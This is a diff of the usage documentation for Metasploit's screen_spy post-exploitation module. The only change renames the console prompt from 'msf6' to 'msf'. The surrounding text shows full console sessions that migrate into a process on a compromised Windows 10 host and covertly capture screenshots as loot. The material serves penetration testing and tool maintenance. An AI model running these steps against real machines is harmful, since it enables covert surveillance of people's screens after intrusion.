@@ -30,10 +30,10 @@ PID to migrate into before taking the screenshots. If no PID is specified, defau
 
 ### Windows 10 20H2 (No Database Connected But RECORD Flag Set)
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
-msf6 post(windows/gather/screen_spy) > set SESSION 1
+msf exploit(multi/handler) > use post/windows/gather/screen_spy
+msf post(windows/gather/screen_spy) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/screen_spy) > show options
+msf post(windows/gather/screen_spy) > show options
 
 Module options (post/windows/gather/screen_spy):
 
@@ -46,9 +46,9 @@ Module options (post/windows/gather/screen_spy):
    SESSION           1                yes       The session to run this module on.
    VIEW_SCREENSHOTS  false            no        View screenshots automatically
 
-msf6 post(windows/gather/screen_spy) > set SESSION 2
+msf post(windows/gather/screen_spy) > set SESSION 2
 SESSION => 2
-msf6 post(windows/gather/screen_spy) > run
+msf post(windows/gather/screen_spy) > run
 
 [*] Capturing 6 screenshots with a delay of 5 seconds
 [-] RECORD flag specified however the database is not connected, so no loot can be stored!
@@ -57,14 +57,14 @@ msf6 post(windows/gather/screen_spy) > run
 
 ### Windows 10 20H2 (No Database Connected, RECORD flag not set)
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
-msf6 post(windows/gather/screen_spy) > set SESSION 2
+msf exploit(multi/handler) > use post/windows/gather/screen_spy
+msf post(windows/gather/screen_spy) > set SESSION 2
 SESSION => 2
-msf6 post(windows/gather/screen_spy) > set RECORD false
+msf post(windows/gather/screen_spy) > set RECORD false
 RECORD => false
-msf6 post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
+msf post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
 VIEW_SCREENSHOTS => true
-msf6 post(windows/gather/screen_spy) > show options
+msf post(windows/gather/screen_spy) > show options
 
 Module options (post/windows/gather/screen_spy):
 
@@ -77,25 +77,25 @@ Module options (post/windows/gather/screen_spy):
    SESSION           2                yes       The session to run this module on.
    VIEW_SCREENSHOTS  true             no        View screenshots automatically
 
-msf6 post(windows/gather/screen_spy) > run
+msf post(windows/gather/screen_spy) > run
 
 [*] Capturing 6 screenshots with a delay of 5 seconds
 [*] Screen Spying Complete
 [*] Post module execution completed
-msf6 post(windows/gather/screen_spy) >
+msf post(windows/gather/screen_spy) >
 ```
 
 ### Windows 10 20H2 (No Database Connected, RECORD flag not set, PID set to Process to Migrate To)
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
-msf6 post(windows/gather/screen_spy) > set SESSION 2
+msf exploit(multi/handler) > use post/windows/gather/screen_spy
+msf post(windows/gather/screen_spy) > set SESSION 2
 SESSION => 2
-msf6 post(windows/gather/screen_spy) > set RECORD false
+msf post(windows/gather/screen_spy) > set RECORD false
 RECORD => false
-msf6 post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
+msf post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
 VIEW_SCREENSHOTS => true
 
-msf6 post(windows/gather/screen_spy) > sessions -i 2
+msf post(windows/gather/screen_spy) > sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter > ps -aux
@@ -116,25 +116,25 @@ Process List
 
 meterpreter > background
 [*] Backgrounding session 2...
-msf6 post(windows/gather/screen_spy) > set PID 8664
+msf post(windows/gather/screen_spy) > set PID 8664
 PID => 8664
-msf6 post(windows/gather/screen_spy) > run
+msf post(windows/gather/screen_spy) > run
 
 [+] Migration successful
 [*] Capturing 6 screenshots with a delay of 5 seconds
 [*] Screen Spying Complete
 [*] Post module execution completed
-msf6 post(windows/gather/screen_spy) >
+msf post(windows/gather/screen_spy) >
 ```
 
 ### Windows 10 20H2 (Database Connected, RECORD flag set)
 ```
-msf6 > use post/windows/gather/screen_spy
-msf6 post(windows/gather/screen_spy) > db_status
+msf > use post/windows/gather/screen_spy
+msf post(windows/gather/screen_spy) > db_status
 [*] Connected to msf. Connection type: postgresql.
-msf6 post(windows/gather/screen_spy) > set SESSION 2
+msf post(windows/gather/screen_spy) > set SESSION 2
 SESSION => 2
-msf6 post(windows/gather/screen_spy) > show options
+msf post(windows/gather/screen_spy) > show options
 
 Module options (post/windows/gather/screen_spy):
 
@@ -147,13 +147,13 @@ Module options (post/windows/gather/screen_spy):
    SESSION           2                yes       The session to run this module on.
    VIEW_SCREENSHOTS  false            no        View screenshots automatically
 
-msf6 post(windows/gather/screen_spy) > run
+msf post(windows/gather/screen_spy) > run
 
 [*] Capturing 6 screenshots with a delay of 5 seconds
 [*] Screen Spying Complete
 [*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
 [*] Post module execution completed
-msf6 post(windows/gather/screen_spy) > loot
+msf post(windows/gather/screen_spy) > loot
 
 Loot
 ====
@@ -179,5 +179,5 @@ host            service  type                 name              content    info 
                          t                                                             efault_172.25.128.214_screenspy.screen_498
                                                                                        562.jpg
 
-msf6 post(windows/gather/screen_spy) >
+msf post(windows/gather/screen_spy) >
 ```
